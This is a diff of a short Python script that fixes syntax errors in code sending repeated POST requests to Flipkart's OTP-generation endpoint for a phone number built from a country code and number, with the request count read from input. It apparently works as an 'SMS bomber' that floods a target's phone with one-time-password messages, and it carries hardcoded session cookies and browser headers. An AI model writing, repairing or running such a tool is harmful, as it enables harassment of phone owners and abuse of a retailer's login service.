@@ -14,7 +14,7 @@ cookies = {
 'gpv_pn': 'HomePage',
 'gpv_pn_t': 'Homepage',
 'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
-'s_sq': '%5B%5BB%5D%5D'},
+'s_sq': '%5B%5BB%5D%5D'}
 
 headers = {
     'Host': 'www.flipkart.com',
@@ -29,15 +29,13 @@ headers = {
     'Referer': 'https://www.flipkart.com/',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
-},
-
+}
 data = {
   'loginId': '+'+cc+pn,
   'state': 'VERIFIED',
   'churnEmailRequest': 'false'
 }
 
-print(type(flipkart))
 n=int(input('no of requests :'))
 for i in range(n):
     response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
